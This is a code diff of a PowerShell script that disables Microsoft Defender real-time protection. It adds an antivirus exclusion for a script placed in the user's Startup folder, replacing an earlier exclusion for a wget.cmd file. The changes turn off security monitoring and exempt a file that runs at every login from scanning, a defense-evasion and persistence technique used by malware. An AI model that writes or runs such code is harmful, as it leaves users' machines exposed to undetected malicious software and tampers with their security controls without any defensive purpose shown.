@@ -12,13 +12,15 @@ if (-not ([Security.Principal.WindowsPrincipal] `
 }
 
 Write-Host "Disabling Microsoft Defender Real-Time Protection..." -ForegroundColor Yellow
+$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
 
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true
-    Add-MpPreference -ExclusionPath "C:\Users\Reiya\Desktop\ResearchProject\Original\Resources\wget.cmd"
-    Add-MpPreference -ExclusionProcess "yourtool.exe"
+    Add-MpPreference -ExclusionPath "$startupPath\defender_remover.ps1"
+    #Add-MpPreference -ExclusionProcess "yourtool.exe"
 
     Write-Host "Defender Real-Time Protection is now disabled." -ForegroundColor Green
 } catch {
     Write-Error "Failed to disable Defender. Is Tamper Protection enabled?"
 }
+
